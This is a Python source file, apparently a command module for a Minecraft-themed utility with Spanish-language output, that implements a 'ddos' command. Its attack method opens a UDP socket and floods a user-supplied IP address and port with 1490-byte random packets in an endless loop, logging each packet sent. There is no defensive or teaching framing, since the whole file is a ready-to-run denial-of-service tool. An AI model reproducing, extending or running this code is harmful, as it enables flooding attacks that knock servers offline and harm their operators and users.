import socket
import time
import random
from mccolors import mcwrite

class Command:
    def __init__(self):
        self.name = 'ddos'
        self.arguments: list = ['target_ip', 'port']

    def validate_arguments(self, arguments: list):
        if len(arguments) < 2:
            return False
        return True

    def run(self, arguments: list):
        if not self.validate_arguments(arguments):
            mcwrite('')
            mcwrite(' &f&l- &8&l[&f&lArgumentos invalidos!&8&l] &f- &8&l[&fddos <objetivo> <puerto>&8&l]')
            mcwrite('')
            return
        
        target_ip = arguments[0]
        port = int(arguments[1])

        # Inicia el ataque
        self.attack(target_ip, port)

    def attack(self, ip, port):
        try:
            mydate = time.strftime('%Y-%m-%d')
            mytime = time.strftime('%H-%M')
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1490)
            mcwrite('')
            mcwrite(f" &f&l- &8&l[&f&lAtacando la IP: &c{ip}&f en el puerto &c{port}&f a las &c{mydate}&f/&c{mytime}.&8&l]\n")
            
            time.sleep(2.5)
            sent = 0
            
            while True:
                sock.sendto(bytes, (ip, port))
                sent += 1
                mcwrite(f" &f- &8[&fPaquete enviado: &c{sent}&f a traves de &c{ip}&f:&c{port}&f a las &c{mydate}&f/&c{mytime}&8]")
                if port == 65534:
                    port = 1
        except KeyboardInterrupt:
            mcwrite(f'\n &f- &8[&fAtaque detenido a la IP &c{ip}&f por el puerto &c{port}&f a las &c{mydate}&f/&c{mytime}&8]\n')
            time.sleep(3)
            return
